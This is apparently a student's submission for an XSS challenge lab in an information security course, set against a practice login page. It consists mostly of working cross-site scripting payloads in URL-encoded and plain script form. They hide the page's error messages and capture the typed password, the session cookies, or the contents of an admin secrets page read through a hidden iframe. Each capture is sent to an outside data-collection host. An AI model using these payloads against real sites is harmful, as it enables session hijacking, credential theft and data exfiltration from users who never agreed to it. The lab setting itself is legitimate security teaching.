Royce Le
INFO 415

Payload1 - 

Payload2 -
http://xss-challenges.r7.io/0/login?username=%3Cscript%3Ewindow.location.replace%28%22http%3A%2F%2Flocalhost%3A8000%2F%22%29%3B%3C%2Fscript%3E&password=hi&user_language=english

Resources Used:
-Payload2-
*How to redirect w/ Javascript
	*http://stackoverflow.com/questions/4744751/how-do-i-redirect-with-javascript
	*http://stackoverflow.com/questions/9800310/add-event-handler-to-html-element-using-javascript
*How to add event handler to html element
	*http://stackoverflow.com/questions/9800310/add-event-handler-to-html-element-using-javascript
*How to change visibility
	*https://www.w3schools.com/jsref/prop_style_visibility.asp

-Payload4-
*How to get an element from w/in an iFrame
	*http://stackoverflow.com/questions/1088544/javascript-get-element-from-within-an-iframe
	*http://stackoverflow.com/questions/16755347/getting-contents-of-iframe-with-pure-javascript
*How to display text from an element
	*https://www.w3schools.com/jsref/prop_html_innerhtml.asp
*How to use an iFrame
	*https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#IFRAME

below is your token for saving and retrieving data
go to http://r7.io/e/[token]?s= and whatever comes after the = will be saved
go to http://r7.io/e/[token] without the s parameter to retrieve the data
http://r7.io/e/J7zkgVqCiG
data will be overwritten with every save
be careful to URL encode what you save so ; & + / don't cause issues

token: J7zkgVqCiG

------------------------My URL Payloads-----------------
PAYLOAD 1
http://xss-challenges.r7.io/0/login?username=%3Cscript%3E+%09var+prob+%3D+document.getElementsByClassName%28%22problem%22%29%3B+%09prob%5B0%5D.style.display+%3D+%22none%22%3B+%09var+errmsg+%3D+document.getElementsByClassName%28%22error-message%22%29%3B+%09errmsg%5B0%5D.style.display+%3D+%22none%22%3B+%09window.onload+%3Dfunction+%28%29%7B+%09var+el+%3D+document.getElementById%28%22signin-btn%22%29%3B+%09if+%28el.addEventListener%29+%7B+%09++++el.addEventListener%28%22click%22%2C+yourFunction%2C+false%29%3B+%09%7D+else+%7B+%09++++el.attachEvent%28%27onclick%27%2C+yourFunction%29%3B+%09%7D+%09%7D%3B+%09function+yourFunction%28%29%7B+%09%09i+%3D+new+Image%28%29%3B+%09%09i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2FJ7zkgVqCiG%3Fs%3DThe+password+is%3A+%27+%2B+document.getElementById%28%27login_password%27%29.value%3B+%09%7D+++%3C%2Fscript%3E&password=hi&user_language=english

PAYLOAD 2

PAYLOAD 3
http://xss-challenges.r7.io/0/login?username=%3Cscript%3E+%09var+prob+%3D+document.getElementsByClassName%28%22problem%22%29%3B+%09prob%5B0%5D.style.display+%3D+%22none%22%3B+%09var+errmsg+%3D+document.getElementsByClassName%28%22error-message%22%29%3B+%09errmsg%5B0%5D.style.display+%3D+%22none%22%3B+%09window.onload+%3Dfunction+%28%29%7B+%09%09alert%28document.cookie%29%3B+%09%09i+%3D+new+Image%28%29%3B+%09%09i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2FJ7zkgVqCiG%3Fs%3DThe+%27+%2B+document.cookie%3B+%09%7D%3B+%3C%2Fscript%3E&password=hi&user_language=english

PAYLOAD 4
http://xss-challenges.r7.io/0/login?username=%3Ciframe+src%3D%22http%3A%2F%2Fxss-challenges.r7.io%2Fadmin%2Fsecrets%22+id%3D%22gotcha%22+style%3D%22opacity%3A+0%3B%22+%3E%3C%2Fiframe%3E+%3Cscript%3E+%09var+prob+%3D+document.getElementsByClassName%28%22problem%22%29%3B+%09prob%5B0%5D.style.display+%3D+%22none%22%3B+%09var+errmsg+%3D+document.getElementsByClassName%28%22error-message%22%29%3B+%09errmsg%5B0%5D.style.display+%3D+%22none%22%3B+%09window.onload%3Dfunction%28%29+%7B+%09%09var+iframe+%3D+document.getElementById%28%27gotcha%27%29%3B+%09%09var+innerDoc+%3D+iframe.contentDocument+%7C%7C+iframe.contentWindow.document%3B+%09%09i+%3D+new+Image%28%29%3B+%09%09i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2FJ7zkgVqCiG%3Fs%3DThe+secret+is%3A+%27+%2B+innerDoc.getElementById%28%22secrets%22%29.innerText%3B+%09%09alert%28innerDoc.getElementById%28%22secrets%22%29.innerText%29%3B+%09%7D+%3C%2Fscript%3E&password=hi&user_language=english

------------------------My Code Payloads-----------------
Payload1
<input id="button" type="submit" name="button" onclick="myFunction();" value="enter"/>
<script>function myFunction(){alert(username + password);};</script>
----------------------------------------------
Payload2
<script>
	var prob = document.getElementsByClassName("problem");
	prob[0].style.display = "none";
	var errmsg = document.getElementsByClassName("error-message");
	errmsg[0].style.display = "none";
	window.onload =function (){
		var el = document.getElementById("signin-btn");
		if (el.addEventListener) {
		    el.addEventListener("click", yourFunction, false);
		} else {
		    el.attachEvent('onclick', yourFunction);
		}
	};
	function yourFunction(){
		alert(document.cookie);
		i = new Image();
		i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + document.cookie;
	}  
</script>
---------------------------------------------------
Payload3
<script>
	var prob = document.getElementsByClassName("problem");
	prob[0].style.display = "none";
	var errmsg = document.getElementsByClassName("error-message");
	errmsg[0].style.display = "none";
	window.onload =function (){
		alert(document.cookie);
		i = new Image();
		i.src='http://r7.io/e/J7zkgVqCiG?s=The ' + document.cookie;
	};
</script>
---------------------------------------------------
Payload4
<iframe src="http://xss-challenges.r7.io/admin/secrets" id="gotcha" style="opacity: 0;" ></iframe>
<script>
	var prob = document.getElementsByClassName("problem");
	prob[0].style.display = "none";
	var errmsg = document.getElementsByClassName("error-message");
	errmsg[0].style.display = "none";
	window.onload=function() {
		var iframe = document.getElementById('gotcha');
		var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
		i = new Image();
		i.src='http://r7.io/e/J7zkgVqCiG?s=The secret is: ' + innerDoc.getElementById("secrets").innerText;
		alert(innerDoc.getElementById("secrets").innerText);
	}
</script>